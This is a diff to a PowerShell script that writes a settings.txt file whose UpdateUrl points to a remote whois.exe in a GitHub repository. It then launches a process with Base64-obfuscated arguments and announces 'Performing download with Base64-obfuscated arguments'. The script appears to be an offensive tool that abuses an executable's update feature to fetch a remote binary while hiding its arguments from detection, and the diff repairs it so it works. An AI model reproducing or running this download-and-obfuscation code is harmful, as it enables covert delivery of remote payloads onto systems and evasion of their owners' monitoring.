@@ -27,8 +27,23 @@ TunnelFile=settings.txt
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
 
+# Define the path for the settings file
+$settingsFilePath = Join-Path -Path $tempDir -ChildPath "settings.txt"
+
+# Write the settings content to the settings.txt file
+Write-Host "[*] Creating settings.txt"
+Set-Content -Path $settingsFilePath -Value $settingsContent -Force
+
+# Check if the settings.txt file was created successfully
+if (Test-Path -Path $settingsFilePath) {
+    Write-Host "[*] settings.txt successfully created."
+} else {
+    Write-Host "[!] Failed to create settings.txt. Exiting script."
+    Exit
+}
+
 # Define the full arguments string
-$rawArguments = "/vpn /lan `"$tempDir\settings.txt`""
+$rawArguments = "/vpn /lan `"$settingsFilePath`""
 
 # Convert the arguments string to Base64
 $encodedArguments = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($rawArguments))
@@ -37,7 +52,7 @@ $encodedArguments = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ra
 $decodeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encodedArguments'))"
 
 # Construct the final execution command
-$arguments = "$decodeCommand"
+$arguments = "-Command $decodeCommand"
 
 # Start the process
 Write-Host "[*] Performing download with Base64-obfuscated arguments"
